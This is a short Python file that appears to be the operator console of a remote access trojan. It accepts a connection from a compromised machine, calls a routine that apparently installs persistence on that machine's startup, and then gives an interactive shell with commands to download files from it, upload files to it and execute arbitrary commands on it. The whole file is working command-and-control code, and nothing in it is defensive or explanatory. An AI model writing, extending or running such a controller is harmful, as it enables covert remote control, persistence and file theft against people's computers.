import socket
from lib import config, eop_npp as eop, server, string_utils


def shell(client: socket.socket, ip: str):
    eop.call_persist_startup(client)

    while True:
        func, args = string_utils.extract_command(input(f"* Shell~{ip}: "))

        # quit
        if func == "quit":
            server.call_quit(client)
            break
        # download [source] [target]
        elif func == "download":
            server.call_download(client, args)
        # upload [source] [target]
        elif func == "upload":
            server.call_upload(client, args)
        # exec [...args]
        elif func == "exec":
            server.call_exec(client, " ".join(args))


if __name__ == "__main__":
    client, ip = server.open_server((config.IP, config.ITR_PORT))
    shell(client, ip)
